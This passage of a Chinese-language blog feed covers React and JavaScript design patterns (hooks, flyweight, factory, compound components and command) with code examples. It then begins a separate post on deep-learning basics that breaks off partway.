class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> setValue(e.target.value)&#125;</span><br><span class="language-xml">        placeholder=&quot;Temp in °C&quot;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      &#123;props.children(value)&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="12、hooks模式：使用函数在整个应用程序的多个组件之间重用有状态逻辑"><a href="#12、hooks模式：使用函数在整个应用程序的多个组件之间重用有状态逻辑" class="headerlink" title="12、hooks模式：使用函数在整个应用程序的多个组件之间重用有状态逻辑"></a>12、hooks模式：使用函数在整个应用程序的多个组件之间重用有状态逻辑</h3><p><a href="https://reactjs.org/docs/hooks-intro.html"><strong>React 16.8 引入了一个名为Hooks</strong></a>的新功能。Hooks 使得使用 React 状态和生命周期方法成为可能，而无需使用 ES2015 类组件。</p><p>虽然 Hook 不一定是一种设计模式，但 Hook 在您的应用程序设计中发挥着非常重要的作用。很多传统的设计模式都可以被 Hook 所取代。</p><p>为了解决 React 开发人员在使用类组件时可能遇到的常见问题，React 引入了<strong>React Hooks</strong>。React Hooks 是可用于管理组件状态和生命周期方法的函数。React Hooks 可以：</p><ul><li>向功能组件添加状态</li><li>管理组件的生命周期，而无需使用生命周期方法，例如<code>componentDidMount</code>和<code>componentWillUnmount</code></li><li>在整个应用程序的多个组件之间重用相同的状态逻辑</li></ul><p>通过<code>useEffect</code>钩子，我们可以<em>“钩入”</em>组件的生命周期。该<code>useEffect</code>钩子有效地结合了<code>componentDidMount</code>、<code>componentDidUpdate</code>和<code>componentWillUnmount</code>生命周期方法。</p><p>除了 React 提供的内置钩子（<code>useState</code>, <code>useEffect</code>, <code>useReducer</code>, <code>useRef</code>, <code>useContext</code>, <code>useMemo</code>, <code>useImperativeHandle</code>, <code>useLayoutEffect</code>, <code>useDebugValue</code>, <code>useCallback</code>）之外，我们还可以轻松创建自己的自定义钩子。</p><p>您可能已经注意到所有钩子都以 开头<code>use</code>。<code>use</code>为了让 React 检查它是否违反了<a href="https://reactjs.org/docs/hooks-rules.html">Hooks 的规则，</a>开始你的 Hooks 是很重要的。</p><h4 id="附加-Hook-指南"><a href="#附加-Hook-指南" class="headerlink" title="附加 Hook 指南"></a>附加 Hook 指南</h4><p>与其他组件一样，当您想要将 Hooks 添加到您编写的代码中时，可以使用一些特殊的函数。下面简单介绍一下一些常见的 Hook 函数：</p><h5 id="useState"><a href="#useState" class="headerlink" title="useState"></a><code>useState</code></h5><p>Hook<code>useState</code>使开发人员能够更新和操作函数组件内部的状态，而无需将其转换为类组件。这个 Hook 的优点之一是它很简单，不需要像其他 React Hook 那样复杂。</p><h5 id="useEffect"><a href="#useEffect" class="headerlink" title="useEffect"></a><code>useEffect</code></h5><p>Hook<code>useEffect</code>用于在功能组件中的主要生命周期事件期间运行代码。函数组件的主体不允许突变、订阅、计时器、日志记录和其他副作用。如果允许，可能会导致用户界面中出现令人困惑的错误和不一致。useEffect 挂钩可以防止所有这些“副作用”并允许 UI 顺利运行。<code>componentDidMount</code>它是、<code>componentDidUpdate</code>、 和的组合<code>componentWillUnmount</code>，全部集中在一处。</p><h5 id="useContext"><a href="#useContext" class="headerlink" title="useContext"></a><code>useContext</code></h5><p>Hook<code>useContext</code>接受一个上下文对象，它是从 返回的值<code>React.createcontext</code>，并返回该上下文的当前上下文值。useContext Hook 还可以与 React Context API 配合使用，以便在整个应用程序中共享数据，而无需通过各个级别向下传递应用程序属性。</p><p>应该注意的是，传递给钩子的参数<code>useContext</code>必须是上下文对象本身，并且<code>useContext</code>只要上下文值发生变化，任何调用该函数的组件都会重新渲染。</p><h5 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a><code>useReducer</code></h5><p>当您具有涉及多个子值的复杂状态逻辑或当下一个状态依赖于前一个状态时， Hook<code>useReducer</code>提供了一种替代方案，<code>setState</code>并且特别优选。它接受一个函数和一个初始状态输入，并通过数组解构 <code>reducer</code>返回当前状态和一个函数作为输出。还优化了触发深度更新的组件的性能。<code>dispatch``useReducer</code></p><h4 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h4><h5 id="更少的代码行"><a href="#更少的代码行" class="headerlink" title="更少的代码行"></a>更少的代码行</h5><p>Hooks 允许您按关注点和功能而不是生命周期对代码进行分组。这使得代码不仅更干净、简洁，而且更短。</p><h5 id="简化复杂组件"><a href="#简化复杂组件" class="headerlink" title="简化复杂组件"></a>简化复杂组件</h5><p>JavaScript 类可能难以管理，难以使用热重载，并且也可能无法缩小。React Hooks 解决了这些问题并确保函数式编程变得简单。通过 Hooks 的实现，我们不需要类组件。</p><h5 id="重用状态逻辑"><a href="#重用状态逻辑" class="headerlink" title="重用状态逻辑"></a>重用状态逻辑</h5><p>JavaScript 中的类鼓励多层次的继承，这会迅速增加整体复杂性和潜在的错误。但是，Hook 允许您使用状态和其他 React 功能，而无需编写类。使用 React，您始终可以重用有状态逻辑，而无需一遍又一遍地重写代码。这减少了出错的机会，并允许使用简单的函数进行组合。</p><h5 id="共享非视觉逻辑"><a href="#共享非视觉逻辑" class="headerlink" title="共享非视觉逻辑"></a>共享非视觉逻辑</h5><p>在 Hooks 实现之前，React 无法提取和共享非可视逻辑。这最终导致了更多的复杂性，例如 HOC 模式和渲染道具，只是为了解决一个常见问题。但是，Hooks 的引入解决了这个问题，因为它允许将状态逻辑提取到简单的 JavaScript 函数中。</p><p>当然，Hooks 有一些潜在的缺点值得记住：</p><ul><li>必须尊重它的规则，如果没有linter插件，很难知道哪个规则被打破了。</li><li>需要大量时间练习才能正确使用（例如：useEffect）。</li><li>注意错误的使用（例如：useCallback、useMemo）。</li></ul><h3 id="13、享元模式：处理相同对象时重用现有实例"><a href="#13、享元模式：处理相同对象时重用现有实例" class="headerlink" title="13、享元模式：处理相同对象时重用现有实例"></a>13、享元模式：处理相同对象时重用现有实例</h3><p>当我们创建大量相似的对象时，享元模式是节省内存的一种有用方法。</p><p>在我们的应用程序中，我们希望用户能够添加书籍。所有书籍都有一个<code>title</code>、一个<code>author</code>和一个<code>isbn</code>编号！然而，图书馆通常不仅仅拥有一本书的一本：它通常拥有同一本书的多本。</p><p>如果同一本书有多个副本，那么每次创建一个新的书籍实例并不是很有用。相反，我们想要创建<code>Book</code>代表一本书的构造函数的多个实例。</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">title, author, isbn</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = title;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">author</span> = author;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isbn</span> = isbn;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>让我们创建将新书添加到列表中的功能。如果一本书具有相同的 ISBN 编号，因此是完全相同的书籍类型，我们不想创建一个全新的<code>Book</code>实例。相反，我们应该首先检查这本书是否已经存在。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> books = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br> <br><span class="hljs-keyword">const</span> <span class="hljs-title function_">createBook</span> = (<span class="hljs-params">title, author, isbn</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> existingBook = books.<span class="hljs-title function_">has</span>(isbn);<br> <br>  <span class="hljs-keyword">if</span> (existingBook) &#123;<br>    <span class="hljs-keyword">return</span> books.<span class="hljs-title function_">get</span>(isbn);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>如果它还不包含图书的 ISBN 编号，我们将创建一本新图书并将其 ISBN 编号添加到集合中<code>isbnNumbers</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">createBook</span> = (<span class="hljs-params">title, author, isbn</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> existingBook = books.<span class="hljs-title function_">has</span>(isbn);<br> <br>  <span class="hljs-keyword">if</span> (existingBook) &#123;<br>    <span class="hljs-keyword">return</span> books.<span class="hljs-title function_">get</span>(isbn);<br>  &#125;<br> <br>  <span class="hljs-keyword">const</span> book = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(title, author, isbn);<br>  books.<span class="hljs-title function_">set</span>(isbn, book);<br> <br>  <span class="hljs-keyword">return</span> book;<br>&#125;;<br></code></pre></td></tr></table></figure><p>该<code>createBook</code>函数帮助我们创建一种类型的书籍的新实例。然而，图书馆通常包含同一本书的多本！让我们创建一个<code>addBook</code>函数，它允许我们添加同一本书的多个副本。它应该调用该<code>createBook</code>函数，该函数返回新创建的<code>Book</code>实例，或返回已经存在的实例。</p><p>为了跟踪总册数，让我们创建一个<code>bookList</code>包含图书馆中图书总数的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> bookList = [];<br> <br><span class="hljs-keyword">const</span> <span class="hljs-title function_">addBook</span> = (<span class="hljs-params">title, author, isbn, availability, sales</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> book = &#123;<br>    ...<span class="hljs-title function_">createBook</span>(title, author, isbn),<br>    sales,<br>    availability,<br>    isbn,<br>  &#125;;<br> <br>  bookList.<span class="hljs-title function_">push</span>(book);<br>  <span class="hljs-keyword">return</span> book;<br>&#125;;<br></code></pre></td></tr></table></figure><p>完美的！<code>Book</code>我们可以有效地使用<code>Book</code>该特定副本的现有实例，而不是每次添加副本时创建一个新实例。让我们创建 3 本书的 5 个副本：《哈利·波特》、《杀死一只知更鸟》和《了不起的盖茨比》。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">addBook</span>(<span class="hljs-string">&quot;Harry Potter&quot;</span>, <span class="hljs-string">&quot;JK Rowling&quot;</span>, <span class="hljs-string">&quot;AB123&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">100</span>);<br><span class="hljs-title function_">addBook</span>(<span class="hljs-string">&quot;Harry Potter&quot;</span>, <span class="hljs-string">&quot;JK Rowling&quot;</span>, <span class="hljs-string">&quot;AB123&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">50</span>);<br><span class="hljs-title function_">addBook</span>(<span class="hljs-string">&quot;To Kill a Mockingbird&quot;</span>, <span class="hljs-string">&quot;Harper Lee&quot;</span>, <span class="hljs-string">&quot;CD345&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">10</span>);<br><span class="hljs-title function_">addBook</span>(<span class="hljs-string">&quot;To Kill a Mockingbird&quot;</span>, <span class="hljs-string">&quot;Harper Lee&quot;</span>, <span class="hljs-string">&quot;CD345&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">20</span>);<br><span class="hljs-title function_">addBook</span>(<span class="hljs-string">&quot;The Great Gatsby&quot;</span>, <span class="hljs-string">&quot;F. Scott Fitzgerald&quot;</span>, <span class="hljs-string">&quot;EF567&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">20</span>);<br></code></pre></td></tr></table></figure><p>虽然有5个副本，但我们只有3个<code>Book</code>实例！</p><p>当您创建大量对象时，享元模式非常有用，这可能会耗尽所有可用RAM 。它允许我们最大限度地减少消耗的内存量。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">在JavaScript中，我们可以通过原型继承</a>轻松解决这个问题。如今，硬件拥有 GB 的RAM ，这使得享元模式不再那么重要。</p><h3 id="14、工厂模式：使用工厂函数来创建对象"><a href="#14、工厂模式：使用工厂函数来创建对象" class="headerlink" title="14、工厂模式：使用工厂函数来创建对象"></a>14、工厂模式：使用工厂函数来创建对象</h3><p>通过工厂模式，我们可以使用<strong>工厂函数</strong>来创建新对象。当一个函数不使用关键字返回一个新对象时，它就是一个工厂函数<code>new</code>！</p><h4 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h4><p>当我们必须创建多个共享相同属性的较小对象时，工厂模式非常有用。工厂函数可以根据当前环境或用户特定的配置轻松返回自定义对象。</p><h4 id="缺点-4"><a href="#缺点-4" class="headerlink" title="缺点"></a>缺点</h4><p>在 JavaScript 中，工厂模式只不过是一个不使用关键字返回对象的函数<code>new</code>。<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions#Arrow_functions">ES6 箭头函数</a>允许我们创建每次隐式返回一个对象的小型工厂函数。</p><p>然而，在许多情况下，每次创建新实例而不是新对象可能会更有效地存储内存。</p><h3 id="15、复合模式：创建多个组件一起工作以执行单个任务"><a href="#15、复合模式：创建多个组件一起工作以执行单个任务" class="headerlink" title="15、复合模式：创建多个组件一起工作以执行单个任务"></a>15、复合模式：创建多个组件一起工作以执行单个任务</h3><p>不是很理解，但确实antd里面有使用，是组件库常用。</p><h4 id="优点-6"><a href="#优点-6" class="headerlink" title="优点"></a>优点</h4><p>复合组件管理自己的内部状态，并在多个子组件之间共享这些状态。在实现复合组件时，我们不必担心自己管理状态。</p><p>导入复合组件时，我们不必显式导入该组件上可用的子组件。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FlyOut</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./FlyOut&quot;</span>;<br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">FlyoutMenu</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FlyOut</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Toggle</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.List</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Item</span>&gt;</span>Edit<span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.Item</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Item</span>&gt;</span>Delete<span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.Item</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.List</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="缺点-5"><a href="#缺点-5" class="headerlink" title="缺点"></a>缺点</h4><p>当使用<code>React.Children.map</code>提供值时，组件嵌套受到限制。只有父组件的<em>直接子</em>组件才能访问<code>open</code>和<code>toggle</code>属性，这意味着我们不能将这些组件中的任何一个包装在另一个组件中。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">FlyoutMenu</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FlyOut</span>&gt;</span></span><br><span class="language-xml">      &#123;/* This breaks */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Toggle</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.List</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Item</span>&gt;</span>Edit<span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.Item</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">FlyOut.Item</span>&gt;</span>Delete<span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.Item</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut.List</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FlyOut</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>克隆元素<code>React.cloneElement</code>执行浅合并。已经存在的道具将与我们传递的新道具合并在一起。如果已经存在的 props 与我们传递给该方法的 props 同名，这可能会导致命名冲突。当 props 被浅层合并时，该 prop 的值将被我们传递的最新值覆盖。<code>React.cloneElement</code></p><h3 id="16、命令模式：通过向指挥官发送命令来解耦执行任务的方法"><a href="#16、命令模式：通过向指挥官发送命令来解耦执行任务的方法" class="headerlink" title="16、命令模式：通过向指挥官发送命令来解耦执行任务的方法"></a>16、命令模式：通过向指挥官发送命令来解耦执行任务的方法</h3><p>使用<strong>命令模式</strong>，我们可以将执行某个任务的对象与调用该方法的对象<em>解耦。</em></p><p>假设我们有一个在线食品配送平台。用户可以下达、跟踪和取消订单。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderManager</span>() &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span> = []<br>  &#125;<br> <br>  <span class="hljs-title function_">placeOrder</span>(<span class="hljs-params">order, id</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span>.<span class="hljs-title function_">push</span>(id)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`You have successfully ordered <span class="hljs-subst">$&#123;order&#125;</span> (<span class="hljs-subst">$&#123;id&#125;</span>)`</span>;<br>  &#125;<br> <br>  <span class="hljs-title function_">trackOrder</span>(<span class="hljs-params">id</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`Your order <span class="hljs-subst">$&#123;id&#125;</span> will arrive in 20 minutes.`</span><br>  &#125;<br> <br>  <span class="hljs-title function_">cancelOrder</span>(<span class="hljs-params">id</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">order</span> =&gt;</span> order.<span class="hljs-property">id</span> !== id)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`You have canceled your order <span class="hljs-subst">$&#123;id&#125;</span>`</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在类上<code>OrderManager</code>，我们可以访问<code>placeOrder</code>,<code>trackOrder</code>和<code>cancelOrder</code>方法。直接使用这些方法将是完全有效的 JavaScript！</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> manager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderManager</span>();<br> <br>manager.<span class="hljs-title function_">placeOrder</span>(<span class="hljs-string">&quot;Pad Thai&quot;</span>, <span class="hljs-string">&quot;1234&quot;</span>);<br>manager.<span class="hljs-title function_">trackOrder</span>(<span class="hljs-string">&quot;1234&quot;</span>);<br>manager.<span class="hljs-title function_">cancelOrder</span>(<span class="hljs-string">&quot;1234&quot;</span>);<br></code></pre></td></tr></table></figure><p>但是，直接在实例上调用方法也有缺点<code>manager</code>。我们可能会决定稍后重命名某些方法，或者方法的功能发生变化。</p><p>假设<code>placeOrder</code>我们现在不再调用它，而是将其重命名为<code>addOrder</code>！这意味着我们必须确保不会<code>placeOrder</code>在代码库中的任何位置调用该方法，这在大型应用程序中可能非常棘手。相反，我们希望将方法与<code>manager</code>对象解耦，并为每个命令创建单独的命令函数！</p><p>让我们重构该类<code>OrderManager</code>：它不再具有<code>placeOrder</code>、<code>cancelOrder</code>和<code>trackOrder</code>方法，而是只有一个方法：<code>execute</code>。该方法将执行它给出的任何命令。</p><p>每个命令都应该有权访问<code>orders</code>管理器，我们将其作为第一个参数传递。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderManager</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span> = [];<br>  &#125;<br> <br>  <span class="hljs-title function_">execute</span>(<span class="hljs-params">command, ...args</span>) &#123;<br>    <span class="hljs-keyword">return</span> command.<span class="hljs-title function_">execute</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">orders</span>, ...args);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要<code>Command</code>为订单管理器创建三个：</p><ul><li><code>PlaceOrderCommand</code></li><li><code>CancelOrderCommand</code></li><li><code>TrackOrderCommand</code></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Command</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">execute</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">execute</span> = execute;<br>  &#125;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">PlaceOrderCommand</span>(<span class="hljs-params">order, id</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>(<span class="hljs-function">(<span class="hljs-params">orders</span>) =&gt;</span> &#123;<br>    orders.<span class="hljs-title function_">push</span>(id);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`You have successfully ordered <span class="hljs-subst">$&#123;order&#125;</span> (<span class="hljs-subst">$&#123;id&#125;</span>)`</span>;<br>  &#125;);<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CancelOrderCommand</span>(<span class="hljs-params">id</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>(<span class="hljs-function">(<span class="hljs-params">orders</span>) =&gt;</span> &#123;<br>    orders = orders.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">order</span>) =&gt;</span> order.<span class="hljs-property">id</span> !== id);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`You have canceled your order <span class="hljs-subst">$&#123;id&#125;</span>`</span>;<br>  &#125;);<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TrackOrderCommand</span>(<span class="hljs-params">id</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Command</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`Your order <span class="hljs-subst">$&#123;id&#125;</span> will arrive in 20 minutes.`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>完美的！<code>OrderManager</code>现在，它们不是将方法直接耦合到实例，而是独立的、解耦的函数，我们<code>execute</code>可以通过<code>OrderManager</code>.</p><h4 id="优点-7"><a href="#优点-7" class="headerlink" title="优点"></a>优点</h4><p>命令模式允许我们将方法与执行操作的对象解耦。如果您正在处理具有一定生命周期的命令或应排队并在特定时间执行的命令，它可以为您提供更多控制。</p><h4 id="缺点-6"><a href="#缺点-6" class="headerlink" title="缺点"></a>缺点</h4><p>命令模式的用例非常有限，并且经常向应用程序添加不必要的样板。</p><blockquote><p>参考：<a href="http://www.patterns.dev/">www.patterns.dev</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>最佳实践</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>设计模式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文选题</title>
    <link href="/blog/2022/12/04/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2022/12/04/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="论文选题"><a href="#论文选题" class="headerlink" title="论文选题"></a>论文选题</h1><p>pick one</p><h2 id="深度学习相关"><a href="#深度学习相关" class="headerlink" title="深度学习相关"></a>深度学习相关</h2><h3 id="1-框架"><a href="#1-框架" class="headerlink" title="1. 框架"></a>1. 框架</h3><p>tensorflow</p><p>pytorch</p><h3 id="2-必备知识点"><a href="#2-必备知识点" class="headerlink" title="2. 必备知识点"></a>2. 必备知识点</h3><h4 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h4><h5 id="正向传播"><a href="#正向传播" class="headerlink" title="正向传播"></a>正向传播</h5><p>一个常见的结构：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_06-34-17-20221204%2021:56:32.png" alt="Snipaste_2022-12-04_06-34-17"></p><p>输入层:比如一张图像</p><p>从输入层到隐藏层:H&#x3D;X*W1+b1</p><p>隐藏层到输出层:Y&#x3D;H*W2+b2</p><p>通过上述两个线性方程的计算，我们就能得到最终的输出Y了，但是如果你还对线性代数的计算有印象的话，应该会知道：一系列线性方程的运算最终都可以用一个线性方程表示。也就是说，上述两个式子联立后可以用一个线性方程表达。对于两次神经网络是这样，就算网络深度加到100层，也依然是这样。这样的话神经网络就失去了意义。</p><p>所以这里要对网络注入灵魂：<strong>激活层</strong>。</p><p>简而言之，激活层是为矩阵运算的结果添加非线性的。常用的激活函数有三种，分别是阶跃函数、Sigmoid和ReLU。不要被奇怪的函数名吓到，其实它们的形式都很简单，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_06-39-19-20221204%2021:56:48.png" 